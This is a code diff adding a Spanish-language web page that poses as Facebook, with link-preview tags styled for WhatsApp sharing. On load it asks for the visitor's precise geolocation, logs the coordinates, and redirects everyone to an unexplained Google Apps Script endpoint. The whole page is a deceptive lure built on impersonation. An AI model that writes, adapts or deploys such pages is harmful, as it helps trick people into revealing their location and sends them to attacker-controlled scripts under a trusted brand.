@@ -1,0 +1,141 @@
+```html
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Facebook</title>
+
+  <!-- Vista previa para WhatsApp -->
+  <meta property="og:title" content="facebook">
+  <meta property="og:description" content="">
+  <meta property="og:type" content="website">
+
+  <meta property="og:image"
+        content="https://raw.githubusercontent.com/MarlonMoreno/facebook.png/main/facebook.png">
+
+  <meta property="og:url"
+        content="https://MarlonMoreno.github.io/facebook.png/">
+
+  <meta name="twitter:card" content="summary_large_image">
+
+  <meta name="twitter:image"
+        content="https://raw.githubusercontent.com/MarlonMoreno/facebook.png/main/facebook.png">
+
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      background: white;
+      font-family: Arial, sans-serif;
+    }
+
+    .contenedor {
+      width: 100%;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    .imagen {
+      width: 180px;
+      height: auto;
+    }
+
+    .mensaje {
+      margin-top: 20px;
+      color: #666;
+      font-size: 15px;
+      text-align: center;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="contenedor">
+
+    <img
+      src="facebook.png"
+      alt="facebook"
+      class="imagen"
+    >
+
+    <div class="mensaje" id="mensaje">
+      Verificando ubicación...
+    </div>
+
+  </div>
+
+  <script>
+
+    const URL_DESTINO =
+      "https://script.google.com/macros/s/AKfycbx90ZnRIV3ze-JmClFmi4G0sg6ZkyNOnfUePFszsYxKZCsCC1QYqcpp9g2kRCFYeX_m/exec";
+
+    function redireccionar() {
+      window.location.href = URL_DESTINO;
+    }
+
+    function solicitarUbicacion() {
+
+      const mensaje = document.getElementById("mensaje");
+
+      if (!navigator.geolocation) {
+
+        mensaje.textContent =
+          "La ubicación no está disponible. Continuando...";
+
+        setTimeout(redireccionar, 1000);
+
+        return;
+      }
+
+      mensaje.textContent =
+        "Solicitando permiso de ubicación...";
+
+      navigator.geolocation.getCurrentPosition(
+
+        function(position) {
+
+          console.log("Latitud:", position.coords.latitude);
+          console.log("Longitud:", position.coords.longitude);
+          console.log("Precisión:", position.coords.accuracy);
+
+          mensaje.textContent =
+            "Ubicación autorizada. Continuando...";
+
+          setTimeout(redireccionar, 500);
+        },
+
+        function(error) {
+
+          console.log("Error de ubicación:", error);
+
+          mensaje.textContent =
+            "No se obtuvo la ubicación. Continuando...";
+
+          setTimeout(redireccionar, 1000);
+        },
+
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    }
+
+    window.addEventListener("load", function() {
+      solicitarUbicacion();
+    });
+
+  </script>
+
+</body>
+</html>
+```
